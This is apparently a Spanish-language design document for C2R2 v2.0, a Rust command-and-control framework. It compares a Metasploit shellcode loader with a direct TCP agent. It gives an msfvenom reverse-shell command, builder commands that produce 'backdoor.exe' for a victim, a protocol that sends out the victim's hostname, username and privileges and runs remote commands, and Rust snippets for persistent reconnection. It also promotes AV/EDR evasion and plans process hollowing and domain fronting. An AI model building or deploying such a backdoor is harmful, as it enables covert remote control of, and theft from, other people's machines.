# C2R2 v2.0 - Conexión Directa sin Shellcode

##  Resumen de Cambios

Este documento explica la diferencia entre el enfoque anterior (v1.0 con shellcode) y el nuevo enfoque (v2.0 con conexión directa), inspirado en [Nightmangle](https://github.com/1N73LL1G3NC3x/Nightmangle).

---

##  Comparación: v1.0 vs v2.0

### **Versión 1.0 (Con Shellcode - Branch anterior)**

#### Flujo de Trabajo:
```
1. Usuario genera shellcode con msfvenom
   └─> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 -f raw > payload.bin

2. Builder encripta el shellcode
   ├─> Genera KEY aleatoria (32 bytes)
   ├─> Genera IV aleatorio (16 bytes)
   ├─> Encripta con AES-256-CBC
   └─> Crea config.rs con:
       - ENCRYPTED_SHELLCODE
       - KEY
       - IV
       - C2_SERVER

3. Agent se compila con config.rs
   └─> Se embebe el shellcode encriptado

4. En ejecución:
   ├─> Desencripta shellcode en memoria
   ├─> Allocate memoria (VirtualAlloc)
   ├─> Copia shellcode a memoria ejecutable
   ├─> Crea thread para ejecutar shellcode
   └─> Shellcode hace reverse connection a msfconsole
```

#### Arquitectura:
```
┌─────────────┐
│  msfvenom   │ Genera shellcode
└──────┬──────┘
       │
       ▼
┌─────────────┐
│   Builder   │ Encripta shellcode + compila agent
└──────┬──────┘
       │
       ▼
┌─────────────┐
│    Agent    │ Desencripta → VirtualAlloc → CreateThread
└──────┬──────┘
       │
       ▼ (Shellcode ejecutado)
┌─────────────┐
│ msfconsole  │ Recibe conexión de meterpreter
└─────────────┘
```

#### Dependencias:
- **Builder**: `aes`, `cbc`, `rand`, `clap`
- **Agent**: `aes`, `cbc`, `winapi` (VirtualAlloc, CreateThread, etc.)
- **Externas**: `msfvenom` (Metasploit Framework)

---

### **Versión 2.0 (Conexión Directa - Branch actual)**

#### Flujo de Trabajo:
```
1. Builder genera configuración
   └─> Crea config.rs con:
       - C2_SERVER (IP:Puerto)

2. Agent se compila con config.rs
   └─> Código Rust puro, sin shellcode

3. En ejecución:
   ├─> Conecta directamente a C2_SERVER vía TCP
   ├─> Envía información del sistema gradualmente
   ├─> Recibe y ejecuta comandos
   └─> Mantiene conexión con keep-alive
```

#### Arquitectura:
```
┌─────────────┐
│   Builder   │ Solo genera config.rs + compila
└──────┬──────┘
       │
       ▼
┌─────────────┐
│    Agent    │ Ejecutable Rust puro
│             │ - TcpStream::connect()
│             │ - Command::new("cmd")
│             │ - Sin shellcode
└──────┬──────┘
       │
       ▼ (Conexión TCP directa)
┌─────────────┐
│ C2R2 Server │ Servidor Tokio (Rust)
│  (Tokio)    │ - Maneja múltiples clientes
└─────────────┘ - Keep-alive ping/pong
```

#### Dependencias:
- **Builder**: `clap` (solo CLI)
- **Agent**: **NINGUNA** (stdlib pura de Rust)
- **Externas**: **NINGUNA**

---

##  Ventajas de la Conexión Directa (v2.0)

### 1. **Independencia Total**
-  **Antes**: Dependías de `msfvenom` → necesitas Metasploit instalado
-  **Ahora**: Todo en Rust → solo necesitas `rustc` y `mingw-w64`

### 2. **Menos Detectable**
-  **Antes**: Shellcode de Metasploit es conocido por AV/EDR
-  **Ahora**: Código Rust compilado nativo → menos firmas conocidas

### 3. **Menos Complejo**
-  **Antes**: Encriptación → Desencriptación → VirtualAlloc → CreateThread
-  **Ahora**: TcpStream directo → Command::output()

### 4. **Más Mantenible**
-  **Antes**: Si cambias protocolo, debes regenerar shellcode
-  **Ahora**: Editas el código Rust y recompilas

### 5. **Tamaño del Binario**
```
v1.0 (con shellcode + AES):
├─ agent.exe: ~150-200 KB
├─ Incluye: shellcode encriptado, librerías AES, winapi
└─ Dependencias: aes, cbc, rand, winapi

v2.0 (conexión directa):
├─ agent.exe: ~50-80 KB
├─ Incluye: solo stdlib de Rust
└─ Dependencias: NINGUNA
```

### 6. **Control Total del Protocolo**
-  **Antes**: Limitado al protocolo de meterpreter
-  **Ahora**: Defines tu propio protocolo C2

---

##  Cómo Usar v2.0

### Desde Kali Linux (Atacante):

#### 1. Instalar Cross-Compilation Tools
```bash
# Instalar mingw-w64 para compilar para Windows
sudo apt install mingw-w64

# Agregar target de Rust
rustup target add x86_64-pc-windows-gnu
```

#### 2. Generar Agente
```bash
cd C2R2

# Compilar builder
cargo build --release

# Generar agente
./target/release/builder --name backdoor --server "192.168.1.100:4444"

# Resultado: backdoor.exe
```

#### 3. Iniciar Servidor C2
```bash
# Compilar servidor
cargo build --release --manifest-path c2r2-server/Cargo.toml

# Iniciar servidor
./target/release/c2r2-server
```

#### 4. Transferir y Ejecutar
```bash
# Copiar backdoor.exe a la víctima (Windows)
# Ejecutar backdoor.exe

# En el servidor, verás:
# [+] Nuevo cliente conectado: <ID>
# Gradualmente recibirás:
#   - Hostname
#   - Username
#   - OS version
#   - Privileges
```

---

##  Análisis Técnico

### Comparación de Memoria en Ejecución

#### v1.0 (Shellcode):
```
┌─────────────────────────────────────┐
│ agent.exe (Proceso)                 │
├─────────────────────────────────────┤
│ .text   → Código del agent          │
│ .data   → ENCRYPTED_SHELLCODE       │
│ .data   → KEY, IV                   │
│ Stack   → Variables locales         │
│ Heap    → Buffer desencriptado      │
│ VAlloc  → Shellcode ejecutable    │ ← Muy sospechoso
│         → (PAGE_EXECUTE_READWRITE)  │
└─────────────────────────────────────┘
```
** Problemas**:
- Memory region con RWX (Read-Write-Execute)
- Shellcode pattern matching
- Injection detectado por EDR

#### v2.0 (Directo):
```
┌─────────────────────────────────────┐
│ agent.exe (Proceso)                 │
├─────────────────────────────────────┤
│ .text   → Código del agent          │
│ .data   → C2_SERVER string          │
│ Stack   → Variables locales         │
│ Heap    → TcpStream, buffers        │
│         → (Normal memory)           │
└─────────────────────────────────────┘
```
** Beneficios**:
- No hay regiones RWX
- Todo es código legítimo compilado
- Parece software normal

---

##  Protocolo C2 v2.0

### Comunicación Agent → Server

#### 1. Conexión Inicial
```
Agent: (TCP connect to C2_SERVER)
```

#### 2. Envío de Información del Sistema
```
Agent → Server: __SYSINFO__:hostname:DESKTOP-ABC123\n
                __SYSINFO__:username:john\n
                __SYSINFO__:os:Windows 10 Pro\n
                __SYSINFO__:privileges:Admin\n
```
*Nota: Enviado todo de una vez al conectarse (sin delays)*

#### 3. Keep-Alive
```
Server → Agent: ping\n
Agent → Server: pong\n
```
*Cada 30 segundos*

#### 4. Ejecución de Comandos
```
Server → Agent: whoami\n
Agent → Server: DESKTOP-ABC123\john\n<<END>>\n

Server → Agent: dir C:\n
Agent → Server: Volume in drive C...
                [contenido del directorio]
                \n<<END>>\n
```

---

##  Evasión y Seguridad

### Técnicas Implementadas en v2.0

#### 1. **Reconexión Automática**
```rust
loop {
    match TcpStream::connect(config::C2_SERVER) {
        Ok(stream) => handle_connection(stream),
        Err(_) => thread::sleep(Duration::from_secs(10)),
    }
}
```
- Si pierde conexión, reintenta cada 10s
- No muere si el servidor cae

#### 2. **Envío Completo de Información al Conectar**
```rust
fn send_sysinfo(writer: &mut TcpStream) {
    // Recopilar toda la información de una vez
    let hostname = get_system_info("hostname");
    let username = get_system_info("username");
    let os = get_system_info("os");
    let privileges = get_system_info("privileges");

    // Enviar todo en un solo mensaje
    let sysinfo = format!("__SYSINFO__:hostname:{}\n...", hostname);
    writer.write_all(sysinfo.as_bytes()).ok();
}
```
- Información completa desde el primer contacto
- No se mezcla con pings o comandos

#### 3. **No hay Firmas de Shellcode**
- Sin `0x4D 0x5A` (MZ header de PE)
- Sin syscalls sospechosos (NtAllocateVirtualMemory, etc.)
- Sin patrones de shellcode conocidos

#### 4. **Sin Inyección de Código**
- No usa `VirtualAlloc`, `CreateRemoteThread`, etc.
- Todo el código está en `.text` legítimo
- Usa APIs normales: `TcpStream`, `Command::new()`

---

##  Próximas Mejoras

### Para v2.1:
- [ ] **Ofuscación de strings**: Encriptar "C2_SERVER" en compilación
- [ ] **API Hashing**: Resolver funciones WinAPI dinámicamente
- [ ] **Process Hollowing**: Inyectarse en proceso legítimo
- [ ] **Domain Fronting**: Camuflar tráfico como HTTPS legítimo
- [ ] **Sleep Obfuscation**: Técnica de `Ekko` para evadir memory scanning

### Para v3.0:
- [ ] **HTTP/HTTPS C2**: Usar protocolo web en vez de TCP raw
- [ ] **Beaconing**: Conexión periódica en vez de persistente
- [ ] **Jitter**: Aleatorizar tiempos de conexión
- [ ] **User-Agent Spoofing**: Simular navegador legítimo
- [ ] **Multi-protocol**: Fallback a DNS/ICMP si TCP falla

---

##  Comparación de Detección

| Indicador                  | v1.0 (Shellcode) | v2.0 (Directo) |
|----------------------------|------------------|----------------|
| Firmas de Shellcode        |  Alto          |  Ninguno     |
| Memory RWX                 |  Presente      |  Ausente     |
| Injection de código        |  Sí            |  No          |
| Dependencia de Metasploit  |  Sí            |  No          |
| Tamaño del binario         |  150-200KB     |  50-80KB     |
| Complejidad del código     |  Media         |  Baja        |
| Mantenibilidad             |  Media         |  Alta        |
| Customización del C2       |  Limitada      |  Total       |

---

##  Conclusión

La versión 2.0 con **conexión directa** sigue el ejemplo de proyectos modernos como **Nightmangle** que usan Telegram como C2. En nuestro caso, usamos un servidor Tokio custom.

### Ventajas Clave:
1.  **Independiente** - No necesita Metasploit
2.  **Más limpio** - Sin shellcode en memoria
3.  **Más pequeño** - Menos dependencias
4.  **Más flexible** - Control total del protocolo
5.  **Menos detectable** - Sin patrones conocidos

### Cuándo Usar Cada Versión:

**Usa v1.0 (Shellcode)** si:
- Necesitas compatibilidad con msfconsole
- Quieres usar payloads de Metasploit
- Necesitas funcionalidades de meterpreter (getsystem, migrate, etc.)

**Usa v2.0 (Directo)** si:
- Quieres un C2 custom
- Buscas máxima evasión
- Prefieres código Rust puro
- No dependes de herramientas externas

---

##  Referencias

- [Nightmangle](https://github.com/1N73LL1G3NC3x/Nightmangle) - C2 con Telegram
- [Sliver](https://github.com/BishopFox/sliver) - C2 moderno en Go
- [Covenant](https://github.com/cobbr/Covenant) - C2 en .NET
- [Havoc](https://github.com/HavocFramework/Havoc) - C2 post-exploitation

---

**Autor**: C2R2 Team
**Versión**: 2.0
**Fecha**: 15 de Octubre, 2025
**Licencia**: Educational Purposes Only
